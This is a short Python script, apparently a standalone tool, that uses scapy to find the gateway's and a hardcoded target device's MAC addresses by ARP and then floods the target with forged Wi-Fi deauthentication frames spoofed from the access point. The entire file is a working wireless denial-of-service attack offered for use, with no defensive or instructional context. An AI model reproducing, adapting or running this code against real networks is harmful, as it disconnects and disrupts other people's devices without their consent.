from scapy.all import *
import scapy.all as scapy

def disconnect_user(mac_address, access_point, interface):
    packet = RadioTap() / Dot11(addr1=mac_address, addr2=access_point, addr3=access_point) / Dot11Deauth(reason=7)
    sendp(packet, inter=0.01, count=100, iface=interface, verbose=1)



def get_mac_address(ip_address):
	arp_request = ARP(pdst=ip_address)
	arp_response = sr1(arp_request,
					timeout=1, verbose=False)
	if arp_response is not None:
		return arp_response.hwsrc
	else:
		return None
	
def getting_ip_of_access_point():
	return scapy.conf.route.route("8.8.8.8")[2]

def getting_ip_of_this_device():
	return scapy.conf.route.route("8.8.8.8")[1]

def getting_interface(ipaddress):
	for interface in ifaces.values():
		if interface.ip == ipaddress:
			return {"name":interface.name,
					"mac":interface.mac}

	
if __name__ == '__main__':

	devce_ip = '192.168.0.73'
	router_ip = getting_ip_of_access_point()
	interface = getting_interface(
	getting_ip_of_this_device())
	mac_address_access_point = get_mac_address(
			router_ip)
	mac_address_device = get_mac_address(
			devce_ip)
	
	print("MAC Address of Access Point : ",
		mac_address_access_point)
	print("MAC Address of Device : ",
		mac_address_device)
	print("Starting Deauthentication Attack on Device : ",
		mac_address_device)
	disconnect_user(mac_address_device,
		mac_address_access_point,interface['name'])

